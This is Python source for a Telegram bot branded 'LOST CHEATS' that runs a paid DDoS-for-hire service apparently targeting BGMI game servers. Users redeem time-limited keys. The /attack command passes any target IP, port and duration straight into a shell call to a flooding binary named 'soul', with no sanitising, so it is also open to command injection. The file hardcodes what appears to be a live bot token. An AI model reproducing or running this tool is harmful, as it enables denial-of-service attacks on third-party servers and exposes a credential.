import asyncio
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '8031055035:AAF9LKlNUqS3S4z2A56VKV-J804sSqnuYEw'
ADMIN_USER_ID = 5579438195
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def load_keys():
    try:
        with open(KEYS_FILE) as f:
            return {line.split(':')[0]: line.split(':')[1].strip() for line in f}
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for key, expiry in keys.items():
            f.write(f"{key}:{expiry}\n")

def generate_key(expiry_time):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return key, expiry_time

users = load_users()
keys = load_keys()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝗟𝗢𝗦𝗧 𝗖𝗛𝗘𝗔𝗧𝗦*\n\n"
        "*𝙱𝙶𝙼𝙸 𝙳𝙳𝙾𝚂 𝙸𝚂 𝚁𝚄𝙽𝗡𝗜𝗡𝗚*\n"
        "*𝘜𝘚𝘌 :- /𝘢𝘵𝘵𝘢𝘤𝘬 𝘐𝘗 𝘱𝘰𝘳𝘵 𝘵𝘪𝘮𝘦*\n\n"
        "*𝗢𝗪𝗡𝗘𝗥 :- @IGNITE_OWNER_1*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*𝗢𝗡𝗟𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗞𝗘𝗬𝗦 🪅*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) < 1 or len(args) > 2:
        await context.bot.send_message(chat_id=chat_id, text="*𝗧𝗬𝗣𝗘 : /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗛𝗼𝘂𝗿𝘀|𝗗𝗮𝘆𝘀|𝗪𝗲𝗲𝗸𝘀|𝗠𝗼𝗻𝘁𝗵𝘀> [Custom_Key]*", parse_mode='Markdown')
        return

    duration = args[0].lower()
    now = datetime.now()

    if duration.endswith("hours"):
        hours = int(duration[:-5])
        expiry_time = now + timedelta(hours=hours)
    elif duration.endswith("days"):
        days = int(duration[:-4])
        expiry_time = now + timedelta(days=days)
    elif duration.endswith("weeks"):
        weeks = int(duration[:-5])
        expiry_time = now + timedelta(weeks=weeks)
    elif duration.endswith("months"):
        months = int(duration[:-6])
        expiry_time = now + timedelta(days=30 * months)
    else:
        await context.bot.send_message(chat_id=chat_id, text="*𝗪𝗢𝗥𝗡𝗚 𝗙𝗢𝗥𝗠𝗔𝗧*", parse_mode='Markdown')
        return

    if len(args) == 2:  # Custom key provided
        custom_key = args[1]
        if custom_key in keys:
            await context.bot.send_message(chat_id=chat_id, text="*❌ 𝗞𝗘𝗬 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗘𝗫𝗜𝗦𝗧𝗦 ❌*", parse_mode='Markdown')
            return
        key = custom_key
    else:  # Generate a random key
        key, expiry_time = generate_key(expiry_time.isoformat())

    expiry_str = expiry_time.isoformat()
    keys[key] = expiry_str
    save_keys(keys)

    await context.bot.send_message(chat_id=chat_id, text=f"*𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 :* `{key}`\n*𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗢𝗡 :* `{expiry_time}`", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*𝐓𝐘𝐏𝐄 : /𝐑𝐄𝐃𝐄𝐄𝐌 <𝐊𝐄𝐘>*", parse_mode='Markdown')
        return

    key = args[0]
    if key in keys:
        expiry_time = datetime.fromisoformat(keys[key])
        if datetime.now() > expiry_time:
            await context.bot.send_message(chat_id=chat_id, text="*❌ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗞𝗘𝗬 ❌*", parse_mode='Markdown')
            del keys[key]
            save_keys(keys)
        else:
            users.add(user_id)
            with open(USERS_FILE, 'a') as f:
                f.write(f"{user_id}\n")
            del keys[key]
            save_keys(keys)
            await context.bot.send_message(chat_id=chat_id, text="*𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗞𝗘𝗬 ❌*", parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*ᴏɴʟʏ 𝗢𝗪𝗡𝗘𝗥 ᴄᴀɴ ᴜꜱᴇ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧*", parse_mode='Markdown')
        return

    message = ' '.join(context.args)
    if not message:
        await context.bot.send_message(chat_id=chat_id, text="*𝗨𝗦𝗘 : /𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 <𝗠𝗔𝗦𝗦𝗔𝗚𝗘>*", parse_mode='Markdown')
        return

    for user in users:
        try:
            await context.bot.send_message(chat_id=int(user), text=message, parse_mode='Markdown')
        except Exception as e:
            print(f"Failed to send message to {user}: {e}")

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./soul {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝗘𝗥𝗥𝗢𝗥 ⚠️: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*🎗️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 🎗️*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    # Attack duration limit (in seconds)
    MAX_DURATION = 300
    BLOCKED_PORTS = {"8700", "20000", "443", "17500", "9031", "20002", "20001"}

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ ɪꜱ 𝗣𝗔𝗡𝗗𝗜𝗡𝗚 ʙᴇᴄᴏᴜꜱᴇ ᴀᴛᴛᴀᴄ𝗞 𝗔𝗟𝗟𝗥𝗘𝗔𝗗𝗬 𝗥𝗨𝗡𝗡𝗜𝗡𝗚*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*/𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Validate duration
    try:
        duration = int(duration)
        if duration > MAX_DURATION:
            await context.bot.send_message(chat_id=chat_id, text=f"*𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗟𝗜𝗠𝗜𝗧: {MAX_DURATION} SECONDS*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡*", parse_mode='Markdown')
        return

    # Block specific ports
    if port in BLOCKED_PORTS:
        await context.bot.send_message(chat_id=chat_id, text=f"*𝗣𝗢𝗥𝗧 {port} 𝗜𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗*\n"
        f"*𝗧𝗔𝗥𝗚𝗘𝗧 :- {ip}*\n"
        f"*ק๏гՇ :- {port}*\n"
        f"*𝗦𝗘𝗖. :- {duration}*\n"
        f"*𝗟𝗼𝘀𝘁𝗕𝗼𝗶𝗫𝗗✨*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Entry point for the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
